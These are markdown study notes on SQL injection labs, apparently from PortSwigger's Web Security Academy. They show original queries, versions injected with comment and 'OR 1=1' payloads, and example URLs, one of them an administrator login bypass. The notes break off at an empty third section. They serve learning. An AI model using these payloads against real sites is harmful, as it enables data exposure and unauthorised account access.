#Red 
## SQL Injection 1
### Analysis
#### Original Query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

-  This query selects all products from the `products` table where the `category` is 'Gifts' and the product is `released`.

---
#### Injected Query 1:

```sql
SELECT * FROM products WHERE category = 'Gifts' --' AND released = 1
```

- The `--` sequence is used to comment out the rest of the SQL query.
- The `AND released = 1` part is ignored, potentially displaying all products in the 'Gifts' category, regardless of their release status.

---
#### Injected Query 2:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

- The condition `OR 1=1` is always true.
- Since `1=1` is always true, the query returns all products, not just those in the 'Gifts' category or those that are released.

---
### Example of Exploit
```
https://0a9e009b03fe6a7d80663a5b004a0029.web-security-academy.net/filter?category=Gift%27+OR+1=1--
```
- Explanation: Injects `Gift' OR 1=1--` into the `category` parameter, making the query always true and returning all products.

---

## SQL Injection 2

### Analysis
#### Original Query:
```sql
SELECT firstname FROM users WHERE username='admin' AND password='admin'
```
- **Description:** Retrieves the `firstname` of the user with `username='admin'` and `password='admin'`.

---
#### Injected Query 1:
```sql
SELECT firstname FROM users WHERE username='' AND password='admin'
```
- **Explanation:** Checks for a user with an empty username. Likely returns no results.

---
#### Injected Query 2:
```sql
SELECT firstname FROM users WHERE username='admin'--' AND password='admin'
```
- **Explanation:** The `--` sequence comments out the rest of the query, effectively checking only for `username='admin'`. Bypasses the password check.

---
#### Injected Query 3:
```sql
SELECT firstname FROM users WHERE username='administrator'--' AND password='admin'
```
- **Explanation:** Similar to Injected Query 2 but uses 'administrator' as the username. If 'administrator' is valid, it bypasses the password check and returns the `firstname`

---
### Example of Exploit

- **Vulnerable URL:**
```
https://example.com/login?username=administrator'--&password=admin
```
- **Explanation:** The payload `administrator'--` in the username parameter bypasses the password check, returning the `firstname` of 'administrator'.

---

## SQL Injection 3
### Analysis
